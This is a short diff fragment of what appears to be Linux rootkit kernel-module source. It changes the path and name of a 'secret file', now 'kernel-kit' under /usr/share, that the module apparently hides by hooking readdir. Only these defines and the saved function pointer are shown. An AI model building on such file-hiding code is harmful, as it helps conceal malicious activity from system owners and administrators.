@@ -30,8 +30,8 @@
 
 MODULE_LICENSE("GPL");
 
-# define ROOT_PATH "/"
-# define SECRET_FILE "032416_525.mp4"
+# define ROOT_PATH "/usr/share/"
+# define SECRET_FILE "kernel-kit"
 
 int
 (*real_readdir)(struct file *filp, void *dirent, filldir_t filldir);
